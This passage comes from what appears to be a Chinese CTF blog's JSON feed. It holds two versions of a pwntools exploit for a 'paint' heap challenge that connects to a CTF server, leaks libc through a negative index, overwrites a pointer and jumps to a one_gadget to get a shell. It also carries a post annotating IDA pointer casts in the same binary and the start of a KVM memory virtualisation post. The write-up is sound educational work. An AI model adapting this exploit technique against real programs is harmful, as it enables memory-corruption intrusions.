class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter rate: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;ment (y/n): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;y&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;r your comment: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(rate))</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#泄漏地址</span></span><br><span class=\"line\">show(-<span class=\"number\">2</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">0xf</span>)</span><br><span class=\"line\">leak=u64(p.recv(<span class=\"number\">8</span>))-<span class=\"number\">0x1300</span></span><br><span class=\"line\">libcbase=leak-(<span class=\"number\">0x7ffff7fad780</span>-<span class=\"number\">0x00007ffff7d93000</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(leak)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(libcbase)</span><br><span class=\"line\"></span><br><span class=\"line\">addr=libcbase+<span class=\"number\">0x219098</span></span><br><span class=\"line\">edit(-<span class=\"number\">8</span>,<span class=\"number\">0x222</span>,<span class=\"string\">&#x27;\\x08\\x01&#x27;</span>*<span class=\"number\">4</span>+p64(addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#system=libcbase+libc.sym[&#x27;/bin/sh\\x00&#x27;]</span></span><br><span class=\"line\"></span><br><span class=\"line\">one=libcbase+<span class=\"number\">0xebcf8</span></span><br><span class=\"line\">drow(-<span class=\"number\">5</span>,p64(one))</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>上述是修改过的,下面是队友原exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">context.log_level=<span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">#elf=ELF(&#x27;pwn&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;libc.so.6&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&#x27;./vuln&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=process(&#x27;./pwn&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;paint-71ae86dc10a3fe17.brics-ctf.ru&#x27;</span>,<span class=\"number\">13003</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\"><span class=\"built_in\">id</span>,wid,hei</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter canvas width (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(wid))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter canvas height (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(hei))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">re</span>(<span class=\"params\"><span class=\"built_in\">id</span>,wid,hei</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter new width (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(wid))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter new height (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.send(<span class=\"built_in\">str</span>(hei))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">drow</span>(<span class=\"params\"><span class=\"built_in\">id</span>,data</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;` chars in `height` lines):&#x27;</span>)</span><br><span class=\"line\">\t<span class=\"comment\">#for i in range(wid):</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tp.send(<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;6&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\"><span class=\"built_in\">id</span>,x,rate</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter rate: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;ment (y/n): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;y&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;r your comment: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(rate))</span><br><span class=\"line\">\t</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">8</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#edit(0,0x20,&#x27;a&#x27;*0x10)</span></span><br><span class=\"line\"><span class=\"comment\">#re(0,0x21,0x20)</span></span><br><span class=\"line\"><span class=\"comment\">#show(-8)</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#add(1,1,0xf)</span></span><br><span class=\"line\">show(-<span class=\"number\">2</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">0xf</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">leak=u64(p.recv(<span class=\"number\">8</span>))-<span class=\"number\">0x1300</span></span><br><span class=\"line\">libcbase=leak-(<span class=\"number\">0x7ffff7fad780</span>-<span class=\"number\">0x00007ffff7d93000</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(leak)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(libcbase)</span><br><span class=\"line\"><span class=\"comment\">#attach(p,&#x27;b *0x00005555555557a3&#x27;)</span></span><br><span class=\"line\">pause()</span><br><span class=\"line\"><span class=\"comment\">#delete(0)</span></span><br><span class=\"line\"><span class=\"comment\">#add(0,0xf0,0xf0)</span></span><br><span class=\"line\">addr=libcbase+<span class=\"number\">0x219098</span></span><br><span class=\"line\">edit(-<span class=\"number\">8</span>,<span class=\"number\">0x222</span>,<span class=\"string\">&#x27;\\x08\\x01&#x27;</span>*<span class=\"number\">4</span>+p64(addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#system=libcbase+libc.sym[&#x27;/bin/sh\\x00&#x27;]</span></span><br><span class=\"line\"></span><br><span class=\"line\">one=libcbase+<span class=\"number\">0xebcf8</span></span><br><span class=\"line\">drow(-<span class=\"number\">5</span>,p64(one))</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-41-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8C%87%E9%92%88%E8%AF%86%E5%88%AB/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-41-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8C%87%E9%92%88%E8%AF%86%E5%88%AB/",
            "title": "pwn入门-41-常见的指针识别",
            "date_published": "2023-09-28T09:26:19.000Z",
            "content_html": "<p>​\t在做题的时候, ida中很多指针看不懂,就很尴尬,需要再好好学习下, 不过还是多积累,遇到题目的时候每次都进行分析,后面就都慢慢熟悉了,(相应的可以根据反汇编代码写源代码,从开发、正向的角度来看)</p>\n<h3 id=\"以一道题目为例子-学习下指针等\"><a href=\"#以一道题目为例子-学习下指针等\" class=\"headerlink\" title=\"以一道题目为例子,学习下指针等\"></a>以一道题目为例子,学习下指针等</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">add_canvas</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v0; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+14h] [rbp-1Ch]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  idx = read_idx();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( canvas[idx] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid index&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    canvas[idx] = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x20</span>uLL); </span><br><span class=\"line\">    v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Enter canvas width (1-255): &quot;</span>);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">&quot;%hhd&quot;</span>, &amp;v2);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Enter canvas height (1-255): &quot;</span>);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">&quot;%hhd&quot;</span>, &amp;v3);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)(v2 * v3) &lt;= <span class=\"number\">0xFF</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v0 = canvas[idx]; <span class=\"comment\">//v0获取canvas画布的堆块的地址,</span></span><br><span class=\"line\">      *(_QWORD *)(v0 + <span class=\"number\">8</span>) = <span class=\"built_in\">malloc</span>((<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)(v2 * v3 + <span class=\"number\">1</span>));</span><br><span class=\"line\">        <span class=\"comment\">//v0+8,然后强制类型转换,再解引用,</span></span><br><span class=\"line\">        <span class=\"comment\">//_QWORD 64位    word</span></span><br><span class=\"line\">      *(_BYTE *)canvas[idx] = v2; <span class=\"comment\">// canvas这里也是QWORD类型(其实可以统一替换成v0的</span></span><br><span class=\"line\">      *(_BYTE *)(canvas[idx] + <span class=\"number\">1LL</span>) = v3;<span class=\"comment\">// 所以+1 是+1 byte</span></span><br><span class=\"line\">      *(_DWORD *)(canvas[idx] + <span class=\"number\">16LL</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">      *(_QWORD *)(canvas[idx] + <span class=\"number\">24LL</span>) = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Too big&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">free</span>((<span class=\"type\">void</span> *)canvas[idx]);</span><br><span class=\"line\">      canvas[idx] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v5 - __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>chatgpt</p>\n<p>在 IDA Pro 中，”_DWORD”、”_QWORD”、”_BYTE” 等标识符通常表示不同的数据类型或数据大小，用于帮助分析和标识反汇编代码中的数据。这些标识符通常与数据类型的大小有关，以下是它们的一般含义：</p>\n<ol>\n<li>“_DWORD”：代表一个32位的双字（Double Word），通常对应于一个32位整数。在汇编和反汇编中，双字通常由4个字节组成。</li>\n<li>“_QWORD”：代表一个64位的四字（Quad Word），通常对应于一个64位整数。在汇编和反汇编中，四字通常由8个字节组成。</li>\n<li>“_BYTE”：代表一个8位的字节（Byte），通常对应于一个字节。在汇编和反汇编中，字节通常由一个字节组成，用于表示较小的数据。</li>\n<li>字是16位(历史原因、兼容原因……….)</li>\n</ol>\n<p>画堆块</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+---------+----------+--------------------+</span><br><span class=\"line\">|                    |                    |</span><br><span class=\"line\">|                    |    chunk head      |</span><br><span class=\"line\">|                    |                    |</span><br><span class=\"line\">+---------+----------+-----------------+--+</span><br><span class=\"line\">+---------+----------+--------------------+</span><br><span class=\"line\">|                    |                    |</span><br><span class=\"line\">|          v3   v2   | v0+<span class=\"number\">8</span> <span class=\"built_in\">malloc</span> canvas |</span><br><span class=\"line\">|                    |                    |</span><br><span class=\"line\">+---------+----------+-----------------+--+</span><br><span class=\"line\"> +---------+----------+--------------------+</span><br><span class=\"line\">|                    |                    |</span><br><span class=\"line\">|                    |                 |</span><br><span class=\"line\">|                    |                    |</span><br><span class=\"line\">+---------+----------+-----------------+--+</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"> 画布</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">draw</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  idx = read_idx();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !canvas[idx] )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid index&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Enter your picture (`width` chars in `height` lines): &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; ; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    result = *(<span class=\"type\">unsigned</span> __int8 *)(canvas[idx] + <span class=\"number\">1LL</span>); <span class=\"comment\">//height</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( i &gt;= result )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    read( <span class=\"comment\">//画一行 width</span></span><br><span class=\"line\">      <span class=\"number\">0</span>,</span><br><span class=\"line\">      (<span class=\"type\">void</span> *)(*(_QWORD *)(canvas[idx] + <span class=\"number\">8LL</span>) + i * *(<span class=\"type\">unsigned</span> __int8 *)canvas[idx]),</span><br><span class=\"line\">      *(<span class=\"type\">unsigned</span> __int8 *)canvas[idx] + <span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;<span class=\"comment\">// *(_QWORD *)(canvas[idx] + 8LL) 是画布的地址,</span></span><br><span class=\"line\">    <span class=\"comment\">//i * *(unsigned __int8 *)canvas[idx] 是i * 宽</span></span><br><span class=\"line\">    <span class=\"comment\">//*(unsigned __int8 *)canvas[idx] + 1 是先取了宽,然后+1,</span></span><br><span class=\"line\">    <span class=\"comment\">// 所以输入0 8 1 的话,就是读入一行,读入9个字符(包括结束符号)</span></span><br><span class=\"line\">    <span class=\"comment\">// 读入地址就是开头呀</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>0 8 1</p>\n<p>结束符号EOF包括\\n \\0?</p>\n<p><strong>函数名</strong>：read</p>\n<p><strong>头文件</strong>：&lt;io.h&gt;</p>\n<p><strong>函数原型</strong>： int read(int handle,void *buf,int len);</p>\n<p><strong>功能</strong>：用于读取打开文件的内容</p>\n<p><strong>参数</strong>：int handle 为要读取的文件</p>\n<p>​     void *buf 为要将读取的内容保存的缓冲区</p>\n<p>​     int len  读取文件的长度</p>\n<p><strong>返回值</strong>：返回实际读取的字节数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> *canvas[<span class=\"number\">5</span>];</span><br><span class=\"line\">    <span class=\"type\">char</span> *str;</span><br><span class=\"line\">    <span class=\"type\">int</span> addr;</span><br><span class=\"line\">    canvas[<span class=\"number\">0</span>] = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x20</span>);</span><br><span class=\"line\">    addr = canvas[<span class=\"number\">0</span>];</span><br><span class=\"line\">    addr = <span class=\"number\">1</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>指针和long int存储的有区别吗? 有区别的,</p>\n<p>如果是long int的话</p>\n<p>*(uintptr_t *)(x+8) &#x3D; malloc(0x30); 先把地址+8,然后强制类型转换成指针,然后解引用</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-3-%E5%86%85%E5%AD%98%E8%99%9A%E6%8B%9F%E5%8C%96%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/",
            "url": "https://tangzichengcc.github.io/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-3-%E5%86%85%E5%AD%98%E8%99%9A%E6%8B%9F%E5%8C%96%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/",
            "title": "虚拟化入门-3-内存虚拟化代码分析",
            "date_published": "2023-09-19T10:19:06.000Z",
            "content_html": "<h1 id=\"一、保护模式Guest的寻址\"><a href=\"#一、保护模式Guest的寻址\" class=\"headerlink\" title=\"一、保护模式Guest的寻址\"></a>一、保护模式Guest的寻址</h1><h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p>​\t\t为每个guest进程分别制作一张表，记录着GVA到HPA的映射关系。guest模式下的cr3寄存器不再指向内部GVA到GPA映射的表，<strong>而是指向这张新的表。</strong>当MMU收到GVA时，通过遍历这张新的表，将GVA翻译成HPA。</p>\n<p>​\t\t\t因为guest自身页表不能完成GVA到HPA的多层地址映射，<strong>因此每当guest设置cr3寄存器时，KVM都需要截获这个操作，将cr3替换为影子页表</strong>，因此每次设置cr3时都需要触发虚拟机退出，陷入KVM模块。（无疑会造成很大的资源消耗，有EPT之后就不用了）</p>\n<p>​\t\t两个关键点：</p>\n<ol>\n<li>KVM需要构建GVA映射到HPA的页表，<strong>这个页表需要根据guest内部页表的信息更新</strong>，实际地址映射时生效的是这张页表，会将guest内部的页表给隐藏起来，所以它叫影子页表</li>\n<li>保护模式的guest有自己的页表，而且不只有一个页表，<strong>每个任务都会有自己的页表，随着任务的切换而更换页表</strong>，所以，KVM也需要准备多个影子页表，每个guest任务对应一个。 <strong>并且在guest内部任务切换时，kvm需要捕获这个切换，切换对应的影子页表。</strong></li>\n</ol>\n<p>​\t\t建立映射时，需要经过三次转换：</p>\n<ul>\n<li>第一次是guest使用自身的页表完成GVA到GPA的转换</li>\n<li>第二次是KVM根据内存条信息完成GPA到HVA的转换</li>\n<li>第三次是host利用内核的内存管理机制完成HVA到HPA的转换</li>\n</ul>\n<p>​\t\t影子页表构建好后，在映射建立完成后，GVA到HPA经过一次映射即可。</p>\n<img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-3-%E5%86%85%E5%AD%98%E8%99%9A%E6%8B%9F%E5%8C%96%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/image-20230917150408144.png\" 